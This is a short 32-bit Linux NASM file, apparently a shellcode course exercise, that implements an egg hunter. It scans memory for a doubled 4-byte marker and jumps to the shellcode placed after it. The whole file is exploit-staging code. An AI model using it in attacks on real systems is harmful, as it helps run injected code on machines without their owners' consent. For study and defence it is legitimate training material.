; File Shellcode_egg_hunter.nasm
; Author: Saleh Bin Muhaysin
; SLEA: SLAE-1101
; Date: 25/12/2017



global _start

section .text

_start:
	mov esi, 0x01234567	; the egg to search for
	xor ecx, ecx
nextpage:
	or cx, 0xfff		; start from address 1000
nextaddress:
	xor eax, eax
	mov al, 67	; sigaction system call
	inc ecx		; increment ecx by 1
	
	; check if the next address less than ffffffff
	cmp ecx, 0xffffffff
	jle exit	; exit if its greater than
	
	int 0x80
	
	cmp al, 0xf2	; check violation (adddress cannot be accessed)
	jz nextpage	; if invalid go to next page
	
	mov eax, esi
	mov edi, ecx
	scasd		; compare content of eax with the egg in edi, eax 
	jnz nextaddress	; if not the egg go to next address
	
	scasd		; check if the next addresss also contain the egg
	jnz nextaddress	; if not the egg go to next address
	
	; if both previous addresses contain the egg, then go to the shellcode
	jmp edi		
	
exit:
	xor eax, eax
	xor ebx, ebx
	mov al, 1
	int 0x80
	
